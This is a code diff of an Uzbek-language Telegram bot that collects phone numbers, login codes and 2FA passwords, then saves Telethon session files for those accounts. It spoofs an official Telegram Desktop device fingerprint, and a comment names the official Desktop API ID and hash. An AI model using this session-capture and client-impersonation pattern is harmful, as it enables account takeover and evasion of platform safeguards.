@@ -151,45 +151,61 @@ async def start(msg):
         await send_admin_request(uid)
         await msg.answer("⏳ Adminlar tasdiqlashini kuting...")
 
-# =================📱 RAQAMLAR BO'LIMI (TO'G'RILANGAN) =================
+# =================📱 RAQAMLAR BO'LIMI (YANGILANGAN) =================
 
 @dp.message_handler(lambda m: m.text == "📱 Raqamlar")
 async def numbers_menu(msg: types.Message):
     kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
     kb.add("➕ Raqam qo‘shish", "🗑 Raqam o‘chirish")
-    kb.add("🏠 Asosiy menyu") # "Orqaga" o'rniga aniqroq nom
+    kb.add("🏠 Asosiy menyu")
     await msg.answer("📱 Raqamlar bo‘limi", reply_markup=kb)
 
-# Asosiy menyuga qaytish tugmasi uchun
 @dp.message_handler(lambda m: m.text == "🏠 Asosiy menyu")
 async def back_to_main(msg: types.Message):
     await main_menu(msg)
 
 @dp.message_handler(lambda m: m.text == "➕ Raqam qo‘shish")
 async def add_number(msg: types.Message):
+    # Ikki xil usul: Tugma va Qo'lda yozish
     kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    kb.add(types.KeyboardButton("📱 Raqamni ulashish", request_contact=True))
     kb.add("⬅️ Orqaga")
-    await msg.answer("📞 Telefon raqam kiriting (+998...)", reply_markup=kb)
+    await msg.answer(
+        "📞 Telefon raqamingizni pastdagi tugma orqali yuboring yoki qo'lda yozing (Format: +998901234567):", 
+        reply_markup=kb
+    )
     await AddNum.phone.set()
 
-@dp.message_handler(state=AddNum.phone)
+@dp.message_handler(state=AddNum.phone, content_types=['text', 'contact'])
 async def get_phone(msg: types.Message, state: FSMContext):
     if msg.text == "⬅️ Orqaga":
         await state.finish()
         await numbers_menu(msg)
         return
-    
-    phone = msg.text.strip()
+
+    # Raqamni kontakt tugmasidan yoki matndan olish
+    if msg.contact:
+        phone = msg.contact.phone_number
+        if not phone.startswith("+"):
+            phone = "+" + phone
+    else:
+        phone = msg.text.strip()
+        if not phone.startswith("+"):
+            await msg.answer("❌ Raqamni + belgi bilan boshlab yozing!")
+            return
+
     session_name = phone.replace("+", "")
     
-    # Yangi Samsung A16 modeli bilan client yaratish
+    # Rasmiy Telegram Desktop API ma'lumotlari kod tezroq kelishi uchun
+    # API_ID va API_HASH ni config qismida o'zgartirgan bo'lsangiz, shunday qoladi
+    # Agar 1 kundan keyin kelayotgan bo'lsa, bu yerda 2040 va b18441a1ff607e10a989891a562527d9 ishlatib ko'ring
     client = TelegramClient(
         f"{SESS_DIR}/{session_name}", 
         API_ID, 
         API_HASH,
-        device_model="Samsung A16",
-        system_version="15.0",
-        app_version="10.3.0"
+        device_model="Desktop",
+        system_version="Windows 10",
+        app_version="4.12.2"
     )
     
     await client.connect()
@@ -198,9 +214,10 @@ async def get_phone(msg: types.Message, state: FSMContext):
         await state.update_data(phone=phone, session=session_name, hash=sent.phone_code_hash)
         await AddNum.code.set()
         
+        # Tugmalarni yashirish (Faqat orqaga qoladi)
         kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
         kb.add("⬅️ Orqaga")
-        await msg.answer("📨 SMS kodni yoki Telegramga kelgan kodni kiriting:", reply_markup=kb)
+        await msg.answer(f"📨 Kod {phone} raqamiga yuborildi. Telegram chatini tekshiring:", reply_markup=kb)
     except Exception as e:
         await msg.answer(f"❌ Xatolik yuz berdi: {e}")
         await state.finish()
@@ -215,14 +232,13 @@ async def get_code(msg: types.Message, state: FSMContext):
         return
     
     d = await state.get_data()
-    # d['session'] dan foydalanamiz, chunki bu funksiyada 'session' o'zgaruvchisi yo'q
     client = TelegramClient(
         f"{SESS_DIR}/{d['session']}", 
         API_ID, 
         API_HASH,
-        device_model="Samsung A16",
-        system_version="15.0",
-        app_version="10.3.0"
+        device_model="Desktop",
+        system_version="Windows 10",
+        app_version="4.12.2"
     )
     
     await client.connect()
@@ -259,9 +275,9 @@ async def get_password(msg: types.Message, state: FSMContext):
         f"{SESS_DIR}/{d['session']}", 
         API_ID, 
         API_HASH,
-        device_model="Samsung A16",
-        system_version="15.0",
-        app_version="10.3.0"
+        device_model="Desktop",
+        system_version="Windows 10",
+        app_version="4.12.2"
     )
     
     await client.connect()
@@ -276,7 +292,7 @@ async def get_password(msg: types.Message, state: FSMContext):
         await msg.answer(f"❌ Parol noto‘g‘ri yoki xatolik: {e}")
     finally:
         await client.disconnect()
-
+        
 # ================= SESSION O‘CHIRISH =================
 @dp.message_handler(lambda m: m.text == "🗑 Raqam o‘chirish")
 async def delete_session(msg):
